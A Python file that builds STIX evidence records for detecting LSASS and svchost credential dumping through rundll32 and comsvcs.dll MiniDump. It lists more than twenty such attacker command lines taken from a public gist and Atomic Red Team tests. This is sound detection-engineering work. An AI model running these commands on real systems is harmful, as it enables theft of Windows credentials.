import delta2.stix as d2s
import uuid
import stix2


_comsvcs_p0001_e01 = {
    "evidence_type": "reference",
    "evidence_source": "johnlatxc_gist",
    "url": "https://gist.github.com/JohnLaTwC/3e7dd4cd8520467df179e93fb44a434e",
    "ns_meta": {
        "date": "2021-06-23",
    },
    "pattern_type": "dict_list",
    "pattern_count": 23,
    "patterns": [
        {
            "process_command_line": r'''"C:\Windows\System32\rundll32.exe"  C:\Windows\System32\comsvcs.dll MiniDump <PID> \Windows\Temp\<filename>.dmp full'''
        },
        {
            "process_command_line": r'''.\rundll32.exe  C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\Users\Administrator\<filename>.dmp full ''',
        },
        {
            "process_command_line": r'''"C:\Windows\system32\sc.exe" \\server create Dump binpath= "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump <PID> C:\dump.bin full"''',
        },
        {
            "process_command_line": r'''"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -c rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Users\username\Desktop\<filename>.DMP full''',
        },
        {
            "process_command_line": r'''"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).id $env:TEMP\lsass-<filename>.dmp full}''',
        },
        {
            "process_command_line": r'''"Powershell" -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID>get-process lsass).id C:\Users\username\AppData\Local\Temp\<filename>.dmp full"''',
        },
        {
            "process_command_line": r'''"C:\Windows\system32\cmd.exe /c "echo string >NUL & powershell -ExecutionPolicy bypass -Command "$a = (Get-Process lsass).id; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>a C:\Windows\TEMP\string\string\<filename>.dmp full" & exit"''',
        },
        {
            "process_command_line": r'''"C:\Windows\system32\cmd.exe /Q /c echo .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\Users\Administrator\<filename>.dmp full ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat''',
        },
        {
            "process_command_line": r'''C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.EXE "rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>get-process lsass).id) C:\Windows\lsass_$(Get-Date -Format dd-MM-hh-mm-ss<filename>dmp full"'''
        },
        {
            "process_command_line": r'''C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).Id \Windows\Temp\<filename>.dmp '''
        },
        {
            "process_command_line": r'''cmd /C "rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> \\ipv4\pwn\<filename>.dmp full"'''
        },
        {
            "process_command_line": r'''cmd.exe  /Q /c for /f "tokens=1,2 delims= " %A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> \Windows\Temp\<filename>.dmp full'''
        },
        {
            "process_command_line": r'''cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> \Windows\Temp\<filename>.dmp full'''
        },
        {
            "process_command_line": r'''cmd.exe /C cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> \Windows\Temp\<filename>.dmp full'''
        },
        {
            "process_command_line": r'''cmd.exe /C powershell.exe -NoP -C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).Id \Windows\Temp\<filename>.dmp full;Wait-Process -Id (Get-Process rundll32).id"'''
        },
        {
            "process_command_line": r'''cmd.exe /Q /c powershell -noni -nop "rundll32.exe comsvcs.dll,minidump <PID> c:\windows\temp\test.log full" 1> \\127.0.0.1\ADMIN$\__1111111.1111111 2>&1'''
        },
        {
            "process_command_line": r'''cmd.exe /Q /c rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\<filename>.dmp full 1> \\127.0.0.1\ADMIN$\__1111111.1111111 2>&1'''
        },
        {
            "process_command_line": r'''powershell  -ExecutionPolicy bypass -Command "$a = (Get-Process lsass).id; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>a C:\temp\blabla"'''
        },
        {
            "process_command_line": r'''powershell  -noni -nop "rundll32.exe comsvcs.dll,minidump <PID> c:\windows\temp\test.log full"'''
        },
        {
            "process_command_line": r'''powershell.exe -ExecutionPolicy Bypass -C "C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).id $env:TEMP\lsass-<filename>.dmp full"'''
        },
        {
            "process_command_line": r'''cmd.exe /Q /c sc create DumpProc binpath= "rundll32 comsvcs,#24 1204 c:\windows\tmp1654.log full" 1> \\127.0.0.1\ADMIN$\__1622704760.494238 2>&1'''
        },
        {
            "process_command_line": r'''rundll32.exe  comsvcs.dll,#24 600 C:\Users\user\Desktop\lsass.dmp full'''
        },
        {
            "process_command_line": r'''sc  create DumpProc binpath= "rundll32 comsvcs,#24 1204 c:\windows\tmp.log full" '''
        }
    ]
}


_comsvcs_p0001_e02 = {
    "evidence_type": "emulation",
    "evidence_source": "atomic_red_team",
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-2---dump-lsassexe-memory-using-comsvcsdll",
    "ns_meta": {
        "guid": "2536dee2-12fb-459a-8c37-971844fa73be",
    },
    "pattern_type": "dict",
    "pattern_count": 1,
    "patterns": {"process_command_line": r'''"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full"'''}
}


_comsvcs_p0001_e03 = {
    "evidence_type": "emulation",
    "evidence_source": "atomic_red_team",
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md#atomic-test-3---dump-svchostexe-to-gather-rdp-credentials",
    "ns_meta": {
        "guid": "d400090a-d8ca-4be0-982e-c70598a23de9",
    },
    "pattern_type": "dict",
    "pattern_count": 1,
    "patterns": {"process_command_line": r'''$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
                if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
                C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full'''}
}


comsvcs__p0001___evidence = d2s.XDeltaEvidence(
    id=d2s.x_delta_evidence + str(uuid.uuid5(d2s.delta_namespace, "comsvcs-p0001--evidence")),
    created_by_ref=d2s.delta_identity,
    created="2025-01-01T00:00:00.000Z",
    modified="2025-01-01T00:00:00.000Z",
    object_marking_refs=[stix2.TLP_WHITE],
    name="Evidence Container comsvcs-p0001",
    x_delta_evidence="comsvcs-p0001--evidence",
    x_evidence_info=[_comsvcs_p0001_e01, _comsvcs_p0001_e02, _comsvcs_p0001_e03]
)



_comsvcs_p0002_e01 = {
    "evidence_type": "emulation",
    "evidence_source": "atomic_red_team",
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-2---dump-lsassexe-memory-using-comsvcsdll",
    "ns_meta": {
        "guid": "2536dee2-12fb-459a-8c37-971844fa73be",
    },
    "pattern_type": "dict",
    "pattern_count": 1,
    "patterns": {
            "file_name": "lsass-<filename>.dmp",
            "initiating_process_file_name": "rundll32.exe",
            "initiating_process_command_line": r'''"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).id $env:TEMP\lsass-<filename>.dmp full}'''
        }

}


comsvcs__p0002___evidence = d2s.XDeltaEvidence(
    id=d2s.x_delta_evidence + str(uuid.uuid5(d2s.delta_namespace, "comsvcs-p0002--evidence")),
    created_by_ref=d2s.delta_identity,
    created="2025-01-01T00:00:00.000Z",
    modified="2025-01-01T00:00:00.000Z",
    object_marking_refs=[stix2.TLP_WHITE],
    name="Evidence Container comsvcs-p0002",
    x_delta_evidence="comsvcs-p0002--evidence",
    x_evidence_info=[_comsvcs_p0002_e01]
)


_comsvcs_p1003_e01 = {
    "evidence_type": "emulation",
    "evidence_source": "atomic_red_team",
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-2---dump-lsassexe-memory-using-comsvcsdll",
    "ns_meta": {
        "guid": "2536dee2-12fb-459a-8c37-971844fa73be",
    },
    "pattern_type": "dict",
    "pattern_count": 1,
    "patterns": {
            "action": "ReadProcessMemoryApiCall",
            "file_name": "lsass-<filename>.dmp",
            "initiating_process_file_name": "rundll32.exe",
            "initiating_process_command_line": r'''"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).id $env:TEMP\lsass-<filename>.dmp full}'''
        }
}


comsvcs__p0003___evidence = d2s.XDeltaEvidence(
    id=d2s.x_delta_evidence + str(uuid.uuid5(d2s.delta_namespace, "comsvcs-p0003--evidence")),
    created_by_ref=d2s.delta_identity,
    created="2025-01-01T00:00:00.000Z",
    modified="2025-01-01T00:00:00.000Z",
    object_marking_refs=[stix2.TLP_WHITE],
    name="Evidence Container comsvcs-p0003",
    x_delta_evidence="comsvcs-p0003--evidence",
    x_evidence_info=[_comsvcs_p1003_e01]
)

